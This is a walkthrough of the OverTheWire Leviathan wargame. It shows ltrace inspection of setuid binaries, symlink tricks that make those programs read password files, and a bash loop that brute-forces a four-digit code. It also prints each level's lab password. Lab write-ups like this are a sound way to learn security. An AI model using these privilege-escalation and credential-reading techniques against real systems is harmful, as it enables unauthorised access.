# Leviathan - Walkthrough
---
## Connecting
```zsh
$ ssh leviathan.labs.overthewire.org -p 2223 -l leviathan{number}
[..]
# Paste user password

 # If you then want to switch user, use
 # Ctrl-d, then uparrow, change login credentials
```

## Levels

**Each level description contains**
+ description
+ commands
+ password

### Level 0

Log in using given credentials:
- login - leviathan0
- password - leviathan0

### Level 0 => 1

In the home directory there is a hidden *.backup* folder. Inside, a HTML file is located. Cat-ing the file gives a lot of output...

```html
$ cat bookmarks.html
    <!DOCTYPE NETSCAPE-Bookmark-file-1>
    <!-- This is an automatically generated file.
        It will be read and overwritten.
        DO NOT EDIT! -->
    <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=UTF-8">
    <TITLE>Bookmarks</TITLE>
    <H1 LAST_MODIFIED="1160271046">Bookmarks</H1>

    <DL><p>
        <DT><H3 LAST_MODIFIED="1160249304" PERSONAL_TOOLBAR_FOLDER="true" ID="rdf:#$FvPhC3">Bookmarks Toolbar Folder</H3>
        [...]
```

The file contains a **whole lot** of bookmarks. Use `grep` on it.

```html
$ cat bookmarks.html | grep pass
    <DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioGegei8m" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
```

This time I was lucky to find it the easy way.

The password for leviathan1 is `rioGegei8m`

### Level 1 => 2

At first glance, there is a script that is executable. Run it

```console
$ ./check
    password: rioGegei8m
    Wrong password, Good Bye ...
```

It looks like it compares strings. Run `ltrace` on it (see the man page).

```console
$ ltrace ./check
    __libc_start_main(0x804853b, 1, 0xffffd774, 0x8048610 <unfinished ...>
    printf("password: ")                                                                                     = 10
    getchar(1, 0, 0x65766f6c, 0x646f6700password:
    )                                                                    = 10
    getchar(1, 0, 0x65766f6c, 0x646f6700
    )                                                                    = 10
    getchar(1, 0, 0x65766f6c, 0x646f6700
    )                                                                    = 10
    strcmp("\n\n\n", "sex")                                                                                  = -1
    puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
    )                                                                     = 29
    +++ exited (status 0) +++
    leviathan1@leviathan:~$ ./check
    password: sex
$ whoami
    leviathan2
$ cat /etc/leviathan_pass/leviathan2
    ougahZi8Ta
```

So that's it! We are now leviathan2! The password is `ougahZi8Ta`

### Level 2 => 3

Now it's getting harder...

```console
$ ls -la
total 28
drwxr-xr-x  2 root       root       4096 Aug 26  2019 .
drwxr-xr-x 10 root       root       4096 Aug 26  2019 ..
-rw-r--r--  1 root       root        220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root       3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan3 leviathan2 7436 Aug 26  2019 printfile
-rw-r--r--  1 root       root        675 May 15  2017 .profile

$ ./printfile 
*** File Printer ***
Usage: ./printfile filename

$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```

Of course it can't be that easy!

Will ltrace unveil the mystery?

```console
$ ltrace ./printfile hello.txt
__libc_start_main(0x804852b, 2, 0xffffd764, 0x8048610 <unfinished ...>
access("hello.txt", 4)                                   = -1
puts("You cant have that file..."You cant have that file...
)                       = 27
+++ exited (status 1) +++
```

Let's try inputting a blank space in the filename.

```console
$ ltrace ~/printfile "hello world.txt"
__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 <unfinished ...>
access("hello world.txt", 4)                             = 0
snprintf("/bin/cat hello world.txt", 511, "/bin/cat %s", "hello world.txt") = 24
geteuid()                                                = 12002
geteuid()                                                = 12002
setreuid(12002, 12002)                                   = 0
system("/bin/cat hello world.txt"/bin/cat: hello: No such file or directory
/bin/cat: world.txt: No such file or directory
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                   = 256
+++ exited (status 0) +++
```

Instead of accessing "hello world.txt" is separates it in two making it two files to check. Interesting...

Aha! This file calls an *access()* command, which, according to it's man page, checks if you are permitted to open a specific file.
It does it by looking at the **OWNER** of the file (real user), not at the executor (effective user). That's it! All there's left to do is to create a file that refers to */etc/leviathan_pass/leviathan3*.

Symbolic link may do it. But first, create a directory under /tmp.

```console
$ mkdir /tmp/adam23 && cd /tmp/adam23
$ touch hello\ world.txt
$ ln -s /etc/leviathan_pass/leviathan3 /tmp/adam23/hello
$ ls -al
total 268
drwxr-sr-x   2 leviathan2 root   4096 Mar  8 18:34 .
drwxrws-wt 177 root       root 266240 Mar  8 18:34 ..
lrwxrwxrwx   1 leviathan2 root     30 Mar  8 18:34 hello -> /etc/leviathan_pass/leviathan3
-rw-r--r--   1 leviathan2 root      0 Mar  8 18:16 hello world.txt
```

OK. Now run the command

```console
$ ~/printfile "hello world.txt"
Ahdiemoo1j
/bin/cat: world.txt: No such file or directory
```

And there it is!
The password is `Ahdiemoo1j`

### Level 3 => 4

Let's get on with it.
Check what is inside.

```console
$ ls -al
total 32
drwxr-xr-x  2 root       root        4096 Aug 26  2019 .
drwxr-xr-x 10 root       root        4096 Aug 26  2019 ..
-rw-r--r--  1 root       root         220 May 15  2017 .bash_logout
-rw-r--r--  1 root       root        3526 May 15  2017 .bashrc
-r-sr-x---  1 leviathan4 leviathan3 10288 Aug 26  2019 level3
-rw-r--r--  1 root       root         675 May 15  2017 .profile
leviathan3@leviathan:~$ ./level3
Enter the password> 1234
bzzzzzzzzap. WRONG
```

Yet another password checking script.
Yet another perfect use for *ltrace*.

```console
$ ltrace ./level3 
__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                               = -1
printf("Enter the password> ")                           = 20
fgets(Enter the password> 12345 123
"12345 123\n", 256, 0xf7fc55a0)                    = 0xffffd590
strcmp("12345 123\n", "snlprintf\n")                     = -1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                               = 19
+++ exited (status 0) +++
```

As we can see, ``strcmp("12345 123\n", "snlprintf\n")`` compares the input with `snlprintf`.
We'll make use of it.

```console
leviathan3@leviathan:~$ ltrace ./level3 
__libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 <unfinished ...>
strcmp("h0no33", "kakaka")                               = -1
printf("Enter the password> ")                           = 20
fgets(Enter the password> snlprintf
"snlprintf\n", 256, 0xf7fc55a0)                    = 0xffffd590
strcmp("snlprintf\n", "snlprintf\n")                     = 0
puts("[You've got shell]!"[You've got shell]!
)                              = 20
geteuid()                                                = 12003
geteuid()                                                = 12003
setreuid(12003, 12003)                                   = 0
system("/bin/sh"$ 
```

We're in. Let me guide you through what just happened:
    - script accepts correct password
    - calls *geteuid()* twice. That means it will receive 12004 uid. In this case it's *12002* simply because we are using ltrace on it.
    - sets user id to that number
    - loggs us into bash

Okay. Do it again, but this time without ltrace.

```console
$ ./level3 
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
```

And now we are leviathan4. Cat it's password and we're done.

```console
$ cat /etc/leviathan_pass/leviathan4
vuH0coox6m
```

The password is `vuH0coox6m`

### Level 4 => 5

This level makes use of a different challenge.

```console
 ls -Al
total 16
-rw-r--r-- 1 root root        220 May 15  2017 .bash_logout
-rw-r--r-- 1 root root       3526 May 15  2017 .bashrc
-rw-r--r-- 1 root root        675 May 15  2017 .profile
dr-xr-x--- 2 root leviathan4 4096 Aug 26  2019 .trash
leviathan4@leviathan:~$ cd .trash/
leviathan4@leviathan:~/.trash$ ls
bin
leviathan4@leviathan:~/.trash$ ls -Al
total 8
-r-sr-x--- 1 leviathan5 leviathan4 7352 Aug 26  2019 bin
leviathan4@leviathan:~/.trash$ ./bin
01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010
```

It gives us a binary string, 8 bits per set. 
I'll use a free *bin-to-ascii* online converter.

It turns out that `Tith4cokei` is the password.

### Level 5 => 6

Gimmie gimmie...

```console
$ ls -Al
total 20
-rw-r--r-- 1 root       root        220 May 15  2017 .bash_logout
-rw-r--r-- 1 root       root       3526 May 15  2017 .bashrc
-r-sr-x--- 1 leviathan6 leviathan5 7560 Aug 26  2019 leviathan5
-rw-r--r-- 1 root       root        675 May 15  2017 .profile
$ ./leviathan5 
Cannot find /tmp/file.log
```

Inspect it with ltrace

```console
$ echo abc > /tmp/file.log
leviathan5@leviathan:~$ ltrace ./leviathan5 
__libc_start_main(0x80485db, 1, 0xffffd784, 0x80486a0 <unfinished ...>
fopen("/tmp/file.log", "r")                              = 0x804b008
fgetc(0x804b008)                                         = 'a'
feof(0x804b008)                                          = 0
putchar(97, 0x8048720, 0xf7e40890, 0x80486eb)            = 97
fgetc(0x804b008)                                         = 'b'
feof(0x804b008)                                          = 0
putchar(98, 0x8048720, 0xf7e40890, 0x80486eb)            = 98
fgetc(0x804b008)                                         = 'c'
feof(0x804b008)                                          = 0
putchar(99, 0x8048720, 0xf7e40890, 0x80486eb)            = 99
fgetc(0x804b008)                                         = '\n'
feof(0x804b008)                                          = 0
putchar(10, 0x8048720, 0xf7e40890, 0x80486ebabc
)            = 10
fgetc(0x804b008)                                         = '\377'
feof(0x804b008)                                          = 1
fclose(0x804b008)                                        = 0
getuid()                                                 = 12005
setuid(12005)                                            = 0
unlink("/tmp/file.log")                                  = 0
+++ exited (status 0) +++
```

It looks for a file to read, and then outputs its content.
Remember that it swaps it's uid to *leviathan6*'s (look at **getuid()**)

A while ago creating a symbolic link linking to user's password was the solution.
Likewise, do that in this situation.

```console
$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
$ ./leviathan5 
UgaoFee4li
```

And there we have it!
The password is `UgaoFee4li`

### Level 6 => 7

The last stretch. Let's get this done.

```console
$ ls -Al
total 20
-rw-r--r-- 1 root       root        220 May 15  2017 .bash_logout
-rw-r--r-- 1 root       root       3526 May 15  2017 .bashrc
-r-sr-x--- 1 leviathan7 leviathan6 7452 Aug 26  2019 leviathan6
-rw-r--r-- 1 root       root        675 May 15  2017 .profile
leviathan6@leviathan:~$ ./leviathan6 
usage: ./leviathan6 <4 digit code>
```

Another script. It requests a 4-digit code. Let's brute force it!
Create an empty directory under tmp, then boot up your favourite text editor.
Next, write this shell script

```bash
#!/bin/bash

for i in {0000..9999}
do
    ~/leviathan6 $i
done
```

Save it. Add the `x` permission to allow file execution. Execute it.

```console
$ chmod +x brute.sh
./brute.sh
```

Give it a moment. After a while you should see a dollar sign indicating, that we succeeded.

```console
[..]
Wrong
Wrong
Wrong
$
```

Check user's password and voilà.

```console
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
```

The password is `ahy7MaeBo9`

### THE END?

We made it!
Let's log in to leviathan7 just to see what's inside...

```console
$ ls -Al
total 16
-rw-r--r-- 1 root       root        220 May 15  2017 .bash_logout
-rw-r--r-- 1 root       root       3526 May 15  2017 .bashrc
-r--r----- 1 leviathan7 leviathan7  178 Aug 26  2019 CONGRATULATIONS
-rw-r--r-- 1 root       root        675 May 15  2017 .profile
leviathan7@leviathan:~$ cat CONGRATULATIONS 
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
```

Uh... I hope they will forgive me my sins :D

### Conclusion

I enjoyed playing this particular wargame. I hope more levels will be added in the future.

For now... I just want to say big thank you to everyone involved in this project 💕